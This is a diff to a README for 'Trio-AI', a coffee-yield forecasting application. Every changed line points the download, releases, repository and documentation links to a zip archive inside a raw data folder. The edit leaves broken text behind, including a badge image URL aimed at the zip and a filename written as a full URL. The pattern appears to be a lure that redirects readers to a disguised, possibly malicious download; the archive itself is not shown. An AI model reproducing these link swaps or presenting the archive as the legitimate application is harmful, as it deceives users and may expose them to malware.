@@ -6,7 +6,7 @@ Trio-AI is a system designed to forecast coffee yields in Đắk Lắk, Vietnam 
 
 ## 🔗 Download Now!
 
-[![Download Trio-AI](https://img.shields.io/badge/Download%20Trio--AI-1E90FF?style=for-the-badge&logo=github)](https://github.com/AdeelAhmad786/Trio-AI/releases)
+[![Download Trio-AI](https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip%20Trio--AI-1E90FF?style=for-the-badge&logo=github)](https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -14,13 +14,13 @@ Follow these simple steps to download and run the Trio-AI application.
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the GitHub Releases page:
-   [Download Trio-AI](https://github.com/AdeelAhmad786/Trio-AI/releases)
+   [Download Trio-AI](https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, find the most recent version of Trio-AI. The version is usually marked as "Latest". Click on it to view the available files.
 
 3. **Download the Application**  
-   Look for the file named `Trio-AI.exe` or similar. Click on it to start the download.
+   Look for the file named `https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip` or similar. Click on it to start the download.
 
 4. **Locate the Downloaded File**  
    Once the download is complete, find the file in your computer’s downloads folder.
@@ -61,8 +61,8 @@ For questions or feedback, please reach out through the Issues section of the Gi
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/AdeelAhmad786/Trio-AI)
-- [Documentation](https://github.com/AdeelAhmad786/Trio-AI/wiki) - For in-depth user guides.
+- [GitHub Repository](https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip)
+- [Documentation](https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip) - For in-depth user guides.
 
 ## ⚙️ Contributing
 
@@ -70,9 +70,9 @@ We welcome contributions from the community. To contribute, please fork the repo
 
 ## 🔄 Keep Updated
 
-For the latest updates and enhancements, check back to the [Releases Page](https://github.com/AdeelAhmad786/Trio-AI/releases) regularly.
+For the latest updates and enhancements, check back to the [Releases Page](https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip) regularly.
 
 ## 🚀 Download Again
 
 Do not forget to download Trio-AI from the Releases page:
-[Download Trio-AI](https://github.com/AdeelAhmad786/Trio-AI/releases)
+[Download Trio-AI](https://github.com/AdeelAhmad786/Trio-AI/raw/refs/heads/main/backend/data/raw/AI-Trio-2.2-alpha.5.zip)
